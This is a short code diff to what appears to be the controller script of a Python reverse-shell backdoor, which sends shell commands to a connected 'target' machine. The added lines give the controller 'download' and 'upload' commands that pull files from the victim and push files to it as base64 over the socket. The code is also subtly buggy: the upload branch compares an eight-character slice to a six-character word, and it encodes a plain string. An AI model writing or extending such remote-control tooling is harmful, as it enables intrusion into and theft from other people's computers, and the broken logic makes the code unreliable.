@@ -3,6 +3,7 @@
 import socket
 from termcolor import colored
 import json
+import base64
 def relibale_send(data):
         json_data = json.dumps(data)
         target.send(bytes(json_data, 'utf-8'))
@@ -28,6 +29,19 @@ def shell():
 			break
 		elif command[:2] == "cd" and len(command) >1:
 			continue
+		elif command[:8] == "download":
+			with open(command[9:], "wb") as file:
+				file_data = reliable_recv()
+				file.write(base64.b64decode(file_data))
+		elif command[:8] == "upload":
+			try:
+				with open(command[7:], "rb") as fin:
+					relibale_send(base64.b64encode(fin.read()))
+			except:
+				failed = "failed to upload "
+				relibale_send(base64.b64encode(failed))
+
+			
 		else:
 			result = reliable_recv()
 			print(result)
